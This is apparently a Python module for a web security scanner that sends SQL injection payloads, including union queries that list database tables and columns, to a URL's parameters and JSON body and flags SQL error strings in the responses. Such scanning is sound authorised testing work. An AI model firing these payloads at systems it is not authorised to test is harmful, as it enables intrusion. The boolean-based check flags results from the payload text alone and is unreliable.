import requests
from typing import List, Dict, Optional

class SQLInjectionScanner:
    @staticmethod
    def scan(url: str, method: str, token: Optional[str] = None) -> List[Dict]:
        results = []
        headers = {'Authorization': f'Bearer {token}'} if token else {}
        
        # SQL Injection patterns
        payloads = {
            "Error Based": [
                "' OR '1'='1",
                "' OR 1=1--",
                "' UNION SELECT NULL--",
                "') OR ('1'='1"
            ],
            "Boolean Based": [
                "' AND 1=1--",
                "' AND 1=2--",
                "' OR 'x'='x",
                "' OR 'a'='a"
            ],
            "Time Based": [
                "'; WAITFOR DELAY '0:0:5'--",
                "'; SLEEP(5)--",
                "' OR SLEEP(5)--",
                "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"
            ],
            "Union Based": [
                "' UNION ALL SELECT NULL,NULL--",
                "' UNION SELECT @@version--",
                "' UNION ALL SELECT table_name,NULL FROM information_schema.tables--",
                "' UNION ALL SELECT NULL,column_name FROM information_schema.columns--"
            ]
        }

        # SQL Error patterns to detect
        sql_errors = [
            "SQL syntax",
            "mysql_fetch_array()",
            "ORA-01756",
            "SQLite3::query",
            "pg_query",
            "System.Data.SQLClient",
            "SQLSTATE",
            "Microsoft SQL Native Client error"
        ]

        for attack_type, attack_payloads in payloads.items():
            for payload in attack_payloads:
                try:
                    # Test in URL parameters
                    params = {'id': payload, 'search': payload}
                    response = requests.request(method, url, params=params, headers=headers, timeout=10)
                    
                    # Test in JSON body
                    json_data = {'query': payload, 'filter': payload}
                    json_response = requests.request(method, url, json=json_data, headers=headers, timeout=10)
                    
                    # Check for SQL errors in responses
                    for resp in [response, json_response]:
                        if any(error in resp.text for error in sql_errors):
                            results.append({
                                'type': 'SQL_INJECTION',
                                'severity': 'HIGH',
                                'detail': f'SQL Injection vulnerability found using {attack_type}',
                                'scenario': attack_type,
                                'evidence': {
                                    'payload': payload,
                                    'status_code': resp.status_code,
                                    'response': resp.text[:500],
                                    'headers': dict(resp.headers),
                                    'error_matched': [e for e in sql_errors if e in resp.text]
                                }
                            })
                            
                        # Check for successful injections without errors
                        if resp.status_code == 200:
                            if attack_type == "Boolean Based":
                                # Compare responses to detect boolean-based injections
                                true_condition = "1=1" in payload
                                false_condition = "1=2" in payload
                                if true_condition != false_condition:
                                    results.append({
                                        'type': 'SQL_INJECTION',
                                        'severity': 'HIGH',
                                        'detail': 'Potential Boolean-based SQL Injection detected',
                                        'scenario': 'Boolean Based',
                                        'evidence': {
                                            'payload': payload,
                                            'status_code': resp.status_code,
                                            'response': resp.text[:500],
                                            'headers': dict(resp.headers)
                                        }
                                    })
                
                except requests.RequestException:
                    continue

        return results

def scan(url: str, method: str, token: Optional[str] = None) -> List[Dict]:
    return SQLInjectionScanner.scan(url, method, token)